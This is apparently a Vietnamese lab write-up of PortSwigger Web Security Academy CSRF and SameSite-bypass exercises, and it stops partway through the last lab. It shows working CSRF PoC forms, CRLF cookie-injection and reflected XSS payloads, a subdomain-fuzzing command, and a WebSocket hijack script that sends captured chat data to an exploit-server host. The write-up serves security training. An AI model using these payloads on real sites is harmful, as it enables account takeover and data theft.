+<h1 id="lab-csrf-where-token-is-not-tied-to-user-session"><strong>Lab: CSRF where token is not tied to user session</strong><a class="headerlink" href="#lab-csrf-where-token-is-not-tied-to-user-session" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session">Lab: CSRF where token is not tied to user session | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện đăng nhập với tài khoản   <code>carlos:montoya</code>. Điều hướng đến chức năng <code>My account &gt; Update email</code> và thực hiện update email</p>
+<p><img alt="image.png" src="image%2015.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt và chuyển request tới API <code>POST /my-account/change-email</code> sang tab Repeater.</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>POST /my-account/change-email HTTP/2
+Host: 0afb00db04cd082780dc171800120072.web-security-academy.net
+Cookie: session=WkZm439AChsdCvfJav5yWpANSUrMHUdw
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 55
+
+email=abc%40a.com<span class="err">&amp;</span>csrf=GgAMfZplnksvbT4gcRrserdELylR50Np
+</code></pre></div>
+<p><img alt="image.png" src="image%2016.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện login với tài khoản <code>wiener:peter</code> . Thực hiện update email. Trong phần mềm Burpsuite, thực hiện chặn request gửi tới API <code>POST /my-account/change-email</code> . Thực hiện lấy <code>csrf</code> token và thay vào request update email của user <code>carlos</code> . Quan sát thấy update email thành công</p>
+<ul>
+<li>
+<p><code>wiener</code> request</p>
+<div class="highlight"><pre><span></span><code>POST /my-account/change-email HTTP/2
+Host: 0afb00db04cd082780dc171800120072.web-security-academy.net
+Cookie: session=PtAThqWnyAzJVy42SkByMXaZaTeAsUh0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 54
+
+email=a1%40a.com<span class="err">&amp;</span>csrf=t31dorkimS6svdFcduY3WQnFnhHLzgMA
+</code></pre></div>
+</li>
+<li>
+<p><code>carlos</code> request</p>
+<div class="highlight"><pre><span></span><code>POST /my-account/change-email HTTP/2
+Host: 0afb00db04cd082780dc171800120072.web-security-academy.net
+Cookie: session=WkZm439AChsdCvfJav5yWpANSUrMHUdw
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+
+email=a1%40a.com<span class="err">&amp;</span>csrf=t31dorkimS6svdFcduY3WQnFnhHLzgMA
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2017.png" /></p>
+<p><img alt="image.png" src="image%2018.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện lấy lại csrf token mới, thực hiện gửi form cho victim bằng exploit server</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0afb00db04cd082780dc171800120072.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;a1&amp;#64;a&amp;#46;com&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;&lt;your-csrf-token&gt;&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện deliver to victim và hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2019.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-csrf-where-token-is-tied-to-non-session-cookie"><strong>Lab: CSRF where token is tied to non-session cookie</strong><a class="headerlink" href="#lab-csrf-where-token-is-tied-to-non-session-cookie" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie">Lab: CSRF where token is tied to non-session cookie | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào 2 tài khoản <code>wiener</code> và <code>carlos</code>. Tại đây, quan sát rằng khi thực hiện <code>Change email</code> thì có csrf token gửi cùng. Tuy nhiên, csrf token này không gắn với user. Thật vậy, khi thực hiện lấy csrf token và csrf token key của user khác, chúng ta vẫn có thể đổi email thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<ul>
+<li>
+<p>User <code>wiener</code></p>
+<p><img alt="image.png" src="image%2020.png" /></p>
+</li>
+<li>
+<p>User <code>carlos</code></p>
+<p><img alt="image.png" src="image%2021.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Như vậy, chúng ta có thể thực hiện tấn công csrf với victim bằng csrf token và csrf key của chúng ta.</p>
+</li>
+<li>
+<p>Còn 1 vấn đề nữa đó là <code>csrfKey</code> lại được lưu ở cookie ⇒ không thể đổi chỉ bằng js được. Tuy nhiên, khi user thực hiện tìm kiếm thì cookie có thêm một value là <code>LastSearchTerm</code> và chúng ta lại có thể dùng <code>CRLF</code> gửi dẫn đến việc set cookie khác như sau:</p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code>aa%0d%0aSet-Cookie%3acsrfKey%3d3jpste6acPLOqBDARLO2oxtz6zGXIe7a
+</code></pre></div>
+</li>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>GET<span class="w"> </span>/?search<span class="o">=</span>aa%0d%0aSet-Cookie%3acsrfKey%3d3jpste6acPLOqBDARLO2oxtz6zGXIe7a<span class="w"> </span>HTTP/2
+Host:<span class="w"> </span>0a2c001d036894b4804b499b00620094.web-security-academy.net
+Cookie:<span class="w"> </span><span class="nv">session</span><span class="o">=</span>2RS98AqwZ4PGxLKwmuzkCHRetBVrvlAs<span class="p">;</span><span class="w"> </span><span class="nv">csrfKey</span><span class="o">=</span>5quQGTttCG4YxyRCp3A1yEQG9NSkLjqr<span class="p">;</span><span class="w"> </span><span class="nv">LastSearchTerm</span><span class="o">=</span><span class="err">&#39;</span><span class="s2">&quot;&gt;&lt;img src=x onerror=alert(1)&gt;</span>
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2022.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi url chứa payload set cookie và csrf bằng cách set timeout cho submit form chỉ khi cookie đã set thành công như sau bằng Exploit server</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0a2c001d036894b4804b499b00620094.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrf-form&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;aaaa@a.com&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;jGgd3UIbdj0gopJhIFn8xxzao9woHRV1&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">deploy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">trigger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">();</span>
+
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">waitCookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="nx">trigger</span><span class="p">.</span><span class="nx">onerror</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">resolve</span><span class="p">;</span>
+<span class="w">          </span><span class="nx">trigger</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">resolve</span><span class="p">;</span>
+<span class="w">        </span><span class="p">});</span>
+
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">labUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://0a2c001d036894b4804b499b00620094.web-security-academy.net/&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">injection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;?search=aa%0d%0aSet-Cookie:csrfKey=3jpste6acPLOqBDARLO2oxtz6zGXIe7a;SameSite=None&quot;</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nx">trigger</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">labUrl</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">injection</span><span class="p">;</span>
+<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">waitCookie</span><span class="p">;</span><span class="w"> </span>
+
+
+<span class="w">          </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;csrf-form&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="nx">deploy</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện deliver to victim. Quan sát lab giải thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2023.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-csrf-where-token-is-duplicated-in-cookie"><strong>Lab: CSRF where token is duplicated in cookie</strong><a class="headerlink" href="#lab-csrf-where-token-is-duplicated-in-cookie" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie">Lab: CSRF where token is duplicated in cookie | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng tìm kiếm và thực hiện tìm kiếm.</p>
+<p><img alt="image.png" src="image%2024.png" /></p>
+</li>
+<li>
+<p>Quan sát trong cookie sau khi thực hiện tìm kiếm, có thêm field <code>LastSearchTerm</code> .</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2025.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện điều hướng đến chức năng <code>My account</code> . Thực hiện update email và nhận thấy có thể luồng kiểm tra server là lấy token ở cookie rồi so sánh với token ở body request, và token này cũng gắn với session vì khi gửi form csrf cho victim với csrf của chúng ta thì attack thất bại ⇒ cần đổi csrf token của victim ở cookie + csrf  ⇒ update email.</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2026.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Vì chúng ta thấy có thể điều khiển cookie bằng cách thêm dấu xuống dòng và set thêm cookie field là csrf token trong response là đổi được token của người dùng</p>
+<ul>
+<li>
+<p>POC</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>GET /?search=aa%0d%0aSet-Cookie%3acsrf%3dtesty<span class="err">&amp;</span>csrf=aaaaaa HTTP/2
+Host: 0add00ce044d5174803303aa00e80042.web-security-academy.net
+Cookie: session=BblPAjGlrVUgJypPwVJZmwqs5OFurHCv; LastSearchTerm=aa
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2027.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Sau đó thực hiện gửi csrf form sau cho victim bằng exploit server. Trước khi submit form, chúng ta dùng await async buộc victim set cookie trước sau đó mới submit form</p>
+<ul>
+<li>
+<p>Exploit server config</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0add00ce044d5174803303aa00e80042.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrf-form&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;abc1@a.com&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;testy&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">deploy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">trigger</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">();</span>
+
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">waitCookie</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Promise</span><span class="p">(</span><span class="nx">resolve</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="nx">trigger</span><span class="p">.</span><span class="nx">onerror</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">resolve</span><span class="p">;</span>
+<span class="w">          </span><span class="nx">trigger</span><span class="p">.</span><span class="nx">onload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">resolve</span><span class="p">;</span>
+<span class="w">        </span><span class="p">});</span>
+
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">labUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://0add00ce044d5174803303aa00e80042.web-security-academy.net/&quot;</span><span class="p">;</span>
+<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">injection</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;?search=test%0d%0aSet-Cookie:csrf=testy;%20SameSite=None;%20Secure&quot;</span><span class="p">;</span>
+
+<span class="w">        </span><span class="nx">trigger</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">labUrl</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">injection</span><span class="p">;</span>
+<span class="w">        </span><span class="k">await</span><span class="w"> </span><span class="nx">waitCookie</span><span class="p">;</span><span class="w"> </span>
+
+<span class="w">        </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;csrf-form&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">      </span><span class="p">}</span>
+
+<span class="w">      </span><span class="nx">deploy</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>Deliver to victim</code> . Quan sát thấy solve lab thành công</p>
+<p><img alt="image.png" src="image%2028.png" /></p>
+</li>
+</ul>
+<h1 id="lab-samesite-lax-bypass-via-method-override"><strong>Lab: SameSite Lax bypass via method override</strong><a class="headerlink" href="#lab-samesite-lax-bypass-via-method-override" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override">Lab: SameSite Lax bypass via method override | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>Change email</code> . Tại đây, quan sát thấy không có cơ chế chống lại csrf attack.</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2029.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện thử nghiệm csrf attack thì không thành công vì mặc định chúng ta không thể lấy được cookie. Tuy nhiên, khi thực get thì có thể gửi request kèm cookie (ví dụ dùng <code>location</code> trên trang khác). Dù vậy, method cho phép update email là POST nên GET không hợp lệ</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2030.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Mặc dù vậy, chúng ta vẫn có thể gửi get request nhưng be sẽ route đến post bằng cách sử dụng ghi đè method như sau. Thực hiện tạo web với form như sau bằng exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code>&lt;html&gt;
+<span class="w">  </span>&lt;!--<span class="w"> </span>CSRF<span class="w"> </span>PoC<span class="w"> </span>-<span class="w"> </span>generated<span class="w"> </span>by<span class="w"> </span>Burp<span class="w"> </span>Suite<span class="w"> </span>Professional<span class="w"> </span>--&gt;
+<span class="w">  </span>&lt;body&gt;
+<span class="w">    </span>&lt;form<span class="w"> </span><span class="nv">action</span><span class="o">=</span><span class="s2">&quot;https://0a7400a103d606e0803703d300760016.web-security-academy.net/my-account/change-email&quot;</span><span class="w"> </span><span class="nv">method</span><span class="o">=</span><span class="s2">&quot;GET&quot;</span>&gt;
+<span class="w">    </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;_method&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span>&gt;
+<span class="w">      </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;email&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;a&amp;#64;a&amp;#46;com&quot;</span><span class="w"> </span>/&gt;
+<span class="w">      </span>&lt;input<span class="w"> </span><span class="nv">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span><span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="s2">&quot;Submit request&quot;</span><span class="w"> </span>/&gt;
+<span class="w">    </span>&lt;/form&gt;
+<span class="w">    </span>&lt;script&gt;
+<span class="w">      </span>history.pushState<span class="o">(</span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">      </span>document.forms<span class="o">[</span><span class="m">0</span><span class="o">]</span>.submit<span class="o">()</span><span class="p">;</span>
+<span class="w">    </span>&lt;/script&gt;
+<span class="w">  </span>&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện Deliver to victim. Quan sát thấy giải lab thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2031.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-samesite-strict-bypass-via-client-side-redirect"><strong>Lab: SameSite Strict bypass via client-side redirect</strong><a class="headerlink" href="#lab-samesite-strict-bypass-via-client-side-redirect" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect">Lab: SameSite Strict bypass via client-side redirect | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Login vào tài khoản <code>wiener:peter</code>. Quan sát rằng, khi thực hiện chức năng <code>Change email</code> chúng ta có thể dùng method <code>GET</code> tuy nhiên thì trang thiết lập samesite strict nên không thể lấy cookie dù là method GET</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2032.png" /></p>
+<p><img alt="image.png" src="image%2033.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện điều hướng đến chức năng xem bài viết và thực hiện comment. Sau khi comment xong, chúng ta thấy được chuyển hướng đến một trang báo comment thành công và tự động quay lại bài viết. Cơ chế này được thực hiện bằng đoạn js sau:</p>
+<p><img alt="image.png" src="image%2034.png" /></p>
+</li>
+<li>
+<p>Quan sát rằng chúng ta có thể kiểm soát param <code>postId</code> và ở đây dùng window location ⇒ open redirect. Mặt khác, trang này cùng origin với trang change email ⇒ bypass samesite strict và change email bằng method get</p>
+</li>
+<li>
+<p>Thực hiện cấu hình exploit server với body là payload sau:</p>
+<ul>
+<li>Exploit server<ul>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">location</span><span class="o">=</span><span class="s2">&quot;https://0ac100ef0405dbba80d012f100a50012.web-security-academy.net/post/comment/confirmation?postId=/../../my-account/change-email?email=a2%40a.com%26submit=1&quot;</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện view exploit ⇒ thành công change email khi truy cập từ trang khác</p>
+<p><img alt="image.png" src="image%2035.png" /></p>
+</li>
+<li>
+<p>Thực hiện deliver to victim. Quan sát solve lab thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2036.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-samesite-strict-bypass-via-sibling-domain"><strong>Lab: SameSite Strict bypass via sibling domain</strong><a class="headerlink" href="#lab-samesite-strict-bypass-via-sibling-domain" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain">Lab: SameSite Strict bypass via sibling domain | Web Security Academy</a></p>
+<ul>
+<li>Trước hết, em thực hiện tìm kiếm attack surface nhưng thực sự không có vị trí nào có lỗi. Tiếp đến em nghĩ đến fuzz subdomain cũng không được. Nhưng đề bài cho là sibling domain → khả năng không là subdomain mà là một domain có tên miền gần giống.</li>
+<li>
+<p>Em thực hiện fuzz bằng <code>ffuf</code> . Tìm được tên miền là <code>cms</code></p>
+<ul>
+<li>
+<p>Payload</p>
+<div class="highlight"><pre><span></span><code>./ffuf/ffuf -H &quot;Host: FUZZ-0ae700ed04f191aa80ac71f700e50006.web-security-academy.net&quot; -w subdomains-top1million-5000.txt   -u https://0ae700ed04f191aa80ac71f700e50006.web-security-academy.net/
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2037.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Tại trang này, em thử nhập uname pwd bất kỳ thì thấy invalid nhưng lại render uname ⇒ test xss ⇒ có reflected xss</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>https://cms-<span class="p">&lt;</span><span class="nt">url-lab</span><span class="p">&gt;</span>/login?username=%27%22%3E%3Cimg%20src=x%20%20onerror=alert(1)%3E<span class="err">&amp;</span>password=a
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2038.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Em có thể chèn script chứa script khởi tạo websocket đồng thời vì nếu tham chiếu theo rule same site thì sibling domain này hoàn toàn có thể vượt qua <code>strict</code>  và load cookie ở domain kia</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code>https://cms-<span class="p">&lt;</span><span class="nt">url-lab</span><span class="p">&gt;</span>/login?username=%3Cscript%3E%20%20%20%20%20%20var%20ws%20%3d%20new%20WebSocket(%27wss%3a%2f%2f0a9600c003aaedc980a067e9005000b0.web-security-academy.net%2fchat%27)%3b%20%20%20%20%20%20%20%20%20%20ws.onopen%20%3d%20function()%20%7b%20%20%20%20%20%20%20%20%20ws.send(%22READY%22)%3b%20%20%20%20%20%7d%3b%20%20%20%20%20%20%20%20%20%20ws.onmessage%20%3d%20function(event)%20%7b%20%20%20%20%20%20%20%20%20%20%20%20%20%20fetch(%27https%3a%2f%2fexploit-0a9b004b03f5ed2d80f066b7019800d4.exploit-server.net%2flog%3fres%3d%27%2bbtoa(event.data))%3b%20%20%20%20%20%7d%3b%20%3C%2fscript%3E<span class="err">&amp;</span>password=a\
+</code></pre></div>
+</li>
+<li>
+<p>Response</p>
+<p><img alt="image.png" src="image%2039.png" /></p>
+</li>
+<li>
+<p>POC</p>
+<ul>
+<li>
+<p>Cookie được load ở <code>sibling domain</code></p>
+<p><img alt="image.png" src="image%2040.png" /></p>
+</li>
+<li>
+<p>Cookie ở domain ban đầu</p>
+<p><img alt="image.png" src="image%2041.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Đồng thời request gửi đến API <code>GET /login</code> của sibling domain không có csrf token ⇒ csrf. Thực hiện gửi cho victim bằng exploit server</p>
+<ul>
